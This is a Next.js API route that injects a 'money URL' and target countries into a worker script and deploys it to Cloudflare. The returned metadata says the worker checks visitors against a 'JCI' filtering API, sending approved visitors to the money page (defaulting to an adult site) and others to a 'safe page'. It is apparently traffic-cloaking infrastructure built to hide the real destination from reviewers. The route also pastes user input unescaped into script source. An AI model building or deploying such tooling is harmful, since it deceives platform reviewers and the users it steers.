import { NextRequest, NextResponse } from 'next/server';
import { readFileSync } from 'fs';
import { join } from 'path';

export async function POST(request: NextRequest) {
  try {
    const { workerName, moneyUrl, targetCountries } = await request.json();
    
    if (!workerName) {
      return NextResponse.json({ error: 'Worker name is required' }, { status: 400 });
    }
    
    // Read the corrected production worker script from file
    const workerScriptPath = join(process.cwd(), 'production-worker-corrected.js');
    let correctedWorkerScript;
    
    try {
      correctedWorkerScript = readFileSync(workerScriptPath, 'utf8');
    } catch (fileError) {
      console.error('Failed to read production-worker-corrected.js:', fileError);
      return NextResponse.json({ 
        error: 'Corrected worker script file not found' 
      }, { status: 500 });
    }
    
    // Replace dynamic values in the script
    correctedWorkerScript = correctedWorkerScript.replace(
      "const MONEY_URL = 'https://www.xnxx.com'; // Will be replaced dynamically",
      `const MONEY_URL = '${moneyUrl}';`
    );
    
    correctedWorkerScript = correctedWorkerScript.replace(
      "const TARGET_COUNTRIES = ['Germany', 'Netherlands']; // Will be replaced dynamically",
      `const TARGET_COUNTRIES = ${JSON.stringify(targetCountries)};`
    );
    
    // Deploy to Cloudflare
    const CLOUDFLARE_API_TOKEN = process.env.CLOUDFLARE_API_TOKEN;
    const CLOUDFLARE_ACCOUNT_ID = process.env.CLOUDFLARE_ACCOUNT_ID;
    
    if (!CLOUDFLARE_API_TOKEN || !CLOUDFLARE_ACCOUNT_ID) {
      return NextResponse.json({ 
        error: 'Cloudflare API credentials not configured' 
      }, { status: 500 });
    }
    
    console.log(`Deploying CORRECTED JCI worker: ${workerName}`);
    
    const response = await fetch(
      `https://api.cloudflare.com/client/v4/accounts/${CLOUDFLARE_ACCOUNT_ID}/workers/scripts/${workerName}`,
      {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/javascript',
          'Authorization': `Bearer ${CLOUDFLARE_API_TOKEN}`,
        },
        body: correctedWorkerScript,
      }
    );
    
    const result = await response.json();
    
    if (!response.ok) {
      console.error('Failed to deploy corrected worker:', result);
      return NextResponse.json({ 
        error: 'Failed to deploy corrected worker',
        details: result.errors || result
      }, { status: 500 });
    }
    
    console.log('Corrected JCI worker deployed successfully:', result);
    
    return NextResponse.json({
      success: true,
      message: `Corrected JCI worker ${workerName} deployed successfully`,
      workerName,
      version: 'production-corrected-1.0',
      jciApiUrl: 'https://jcibj.com/lapi/rest/r/USER_ID/IP/USERAGENT',
      logic: 'type=false → money page, type=true → safe page',
      features: [
        'CORRECT JCI API URL format',
        'Real JCI API calls with proper endpoint',
        'Correct response logic (type: false = money)',
        'Money page redirects for approved visitors',
        'Proper domain logging',
        'Comprehensive error handling'
      ]
    });
    
  } catch (error) {
    console.error('Error deploying corrected worker:', error);
    return NextResponse.json({
      error: error instanceof Error ? error.message : 'Unknown error'
    }, { status: 500 });
  }
} 